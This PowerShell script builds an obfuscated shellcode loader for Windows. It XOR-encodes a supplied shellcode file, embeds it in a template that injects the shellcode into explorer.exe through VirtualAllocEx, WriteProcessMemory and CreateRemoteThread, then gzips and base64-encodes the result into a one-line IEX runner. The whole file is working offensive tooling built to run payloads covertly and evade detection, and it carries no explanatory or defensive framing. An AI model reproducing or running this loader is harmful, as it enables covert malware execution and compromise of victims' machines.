Param($shellcode,$filename)

$script = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}
function func_get_delegate_type {
	Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,[Parameter(Position = 1)] [Type] $var_return_type = [Void])
	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
	return $var_type_builder.CreateType()
}
$key = "<xor_key>"
[int[]] $xorbuf = <xor_shellcode>
$buf = for($i=0; $i -lt $xorbuf.Length; $i++){(($xorbuf[$i]) -bxor $key[$i % $key.Length])}
[uInt32]$pid = Get-Process explorer | select -expand id 
[IntPtr]$handle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll OpenProcess), (func_get_delegate_type @([UInt32], [bool], [UInt32]) ([IntPtr]))).Invoke(0x001F0FFF, "False", $pid)
[IntPtr]$address = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAllocEx), (func_get_delegate_type @([IntPtr], [IntPtr], [UInt32], [UInt64], [UInt32]) ([IntPtr]))).Invoke($handle,[IntPtr]::Zero,$buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32]))).Invoke($handle, $address, $buf, $buf.Length, 0)
$thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll CreateRemoteThread), (func_get_delegate_type @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [UInt32]))).Invoke($handle,[IntPtr]::Zero,0,$address,[IntPtr]::Zero,0,$threadid)
'@

$runner = @'
(New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream((New-Object System.IO.MemoryStream([System.Convert]::FromBase64String('<gz_stream>'),0,<gz_length>)),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()|IEX
'@

function xor {
    Param ($xorkey, $array)
    for($i=0; $i -lt $array.Count; $i++) {
        $array[$i] -bxor $xorkey[$i % $xorkey.Length]
    }
}

$buf = Get-Content $shellcode -Encoding Byte

$key = "Q0DTYXkM\;Kpm0AF,a9~Q8A\\1Vh_:Xin!RQ/7/yObiau#,ia/Ubf\*RK1wreK;\XDd$;G-SS^C8,W69Sgu@7@K1aUX'LsQ/BMh;S?v3;I'6h7Fy/"
$xorbuf = ((xor $key $buf) -join ",")

$script = $script.Replace("<xor_key>", $key).Replace("<xor_shellcode>", $xorbuf)

$byteArray = [System.Text.Encoding]::ASCII.GetBytes($script)

[System.IO.Stream]$memoryStream = New-Object System.IO.MemoryStream
[System.IO.Stream]$gzipStream = New-Object System.IO.Compression.GzipStream $memoryStream, ([System.IO.Compression.CompressionMode]::Compress)
$gzipStream.Write($ByteArray, 0, $ByteArray.Length)
$gzipStream.Close()
$memoryStream.Close()
[byte[]]$gzipStream = $memoryStream.ToArray()

$encodedGzipStream = [System.Convert]::ToBase64String($gzipStream)

$runner.Replace("<gz_stream>", $encodedGzipStream).Replace("<gz_length>", $gzipStream.Length) | Out-File -FilePath $filename